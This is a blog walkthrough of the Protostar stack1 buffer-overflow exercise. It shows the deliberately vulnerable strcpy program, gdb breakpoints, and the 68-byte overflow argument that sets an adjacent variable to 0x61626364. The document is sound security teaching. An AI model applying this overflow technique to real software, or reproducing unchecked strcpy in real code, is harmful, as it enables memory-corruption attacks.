---
title: "Protostar stack1 walkthrough"
date: 2020-05-21
tags: [buffer overflow, protostar, stack1, walkthrough]
header:
  image: "/images/protostar/protostar.png"
---


## Protostar exercises - [stack1](https://exploit-exercises.lains.space/protostar/stack1/)


#### About
This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

This level is at /opt/protostar/bin/stack1

Hints

If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
Protostar is little endian

#### Source code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

#### Procedure:

Similar to the previous one, the value of 'modified' variable needs to be changed. But here, it need to be changed to a specific value.

There is no `gets()` call in this program. Instead, `strcpy()` is used to copy the argument into buffer. 

##### Vulnerability:

`strcpy()` is used to copy a string. if the destination string of a `strcpy()` is not large enough, then buffer overflow happens. We can use this to overflow the 64 bit buffer and write into the memory address where 'modified' is stored.

##### Disassembly:

Lets start by disassembling the binary

```
gdb ./stack1
(gdb) set disassembly-flavor intel
(gdb) disassemble main
```


![disassembly]({{site.url}}{{site.baseurl}}/images/protostar/stack1/disassembly.png)

We can see that 'modified' variable is at $esp+0x5c. Lets put breakpoints before and after `strcpy()` and create hooks

```
break *0x080484a2
break *0x080484a7
define hook-stop
>info registers
>x/24wx $esp
>x/2i $eip
>end
```

Lets run with argument AAAAAAAA
```
r AAAAAAAA
```

We can see that addresses 0xbffff75c and 0xbffff760 are overwritten with A's. Also, 'modified' is stored at 0xbffff79c and has value of 0x00000000

![registers]({{site.url}}{{site.baseurl}}/images/protostar/stack1/registers.png)

We need to overwrite from 0xbffff75c to 0xbffff79c. That is 40 + 4 words (68 bytes)
Lets create a string of 68 bytes and make sure variable is overwritten
` r AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIII`

![overwrite]({{site.url}}{{site.baseurl}}/images/protostar/stack1/overwrite.png)

We can see that 0xbffff79c now has a value of 0x49494949 or IIII

Now we need to change I's in string to 0x61626364 (abcd)
Lets run with this argument 
`r AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHabcd`

![try]({{site.url}}{{site.baseurl}}/images/protostar/stack1/try.png)

Now we can see that 'modified' is changed to 0x64636261. This is because prostar is little endian (as mentioned in hints). Lets try with dcba instead

`r AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHdcba`

![done]({{site.url}}{{site.baseurl}}/images/protostar/stack1/done.png)

Now, the variable has 0x61626364 and the program has passed
